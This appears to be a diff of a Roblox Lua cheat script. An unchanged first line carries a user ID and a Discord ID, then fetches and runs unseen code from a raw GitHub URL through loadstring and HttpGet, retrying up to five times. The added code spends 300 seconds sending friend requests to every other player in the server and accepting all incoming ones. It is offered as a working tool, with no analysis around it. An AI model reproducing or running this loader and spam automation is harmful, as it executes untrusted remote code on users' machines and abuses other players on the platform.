@@ -1,1 +1,79 @@
 _G.Config={UserID="3087df52-2f5c-4e6f-a407-10fa72d16932",discord_id="1135837863603351573",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/bgsi"))()end)if s then break end wait(5)end
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local STOP_AFTER = 300
+local startTime = os.clock()
+
+local friendCache = {}
+local sent = {}
+
+local function timeUp()
+    return os.clock() - startTime >= STOP_AFTER
+end
+
+local function getFriends(userId)
+    local ok, result = pcall(function()
+        local ids = {}
+        local pages = Players:GetFriendsAsync(userId)
+        while true do
+            for _, v in pages:GetCurrentPage() do
+                ids[v.Id] = true
+            end
+            if pages.IsFinished then break end
+            pages:AdvanceToNextPageAsync()
+        end
+        return ids
+    end)
+    return ok and result or {}
+end
+
+local function refreshPlayer(plr)
+    if not plr.Parent then return end
+    friendCache[plr] = getFriends(plr.UserId)
+end
+
+Players.PlayerAdded:Connect(refreshPlayer)
+Players.PlayerRemoving:Connect(function(plr)
+    friendCache[plr] = nil
+end)
+
+for _, plr in Players:GetPlayers() do
+    task.spawn(refreshPlayer, plr)
+end
+
+task.spawn(function()
+    while not timeUp() do
+        for _, plr in Players:GetPlayers() do
+            if timeUp() then break end
+            if plr ~= LocalPlayer and not sent[plr.UserId] then
+                pcall(function()
+                    Players:PromptFriendRequest(LocalPlayer, plr)
+                end)
+                sent[plr.UserId] = true
+                task.wait(0.4)
+            end
+        end
+        task.wait(5)
+    end
+end)
+
+task.spawn(function()
+    while not timeUp() do
+        pcall(function()
+            local pages = Players:GetFriendRequestsAsync()
+            while true do
+                for _, req in pages:GetCurrentPage() do
+                    if timeUp() then return end
+                    pcall(function()
+                        Players:AcceptFriendRequest(req.Id)
+                    end)
+                    task.wait(0.4)
+                end
+                if pages.IsFinished then break end
+                pages:AdvanceToNextPageAsync()
+            end
+        end)
+        task.wait(5)
+    end
+end)
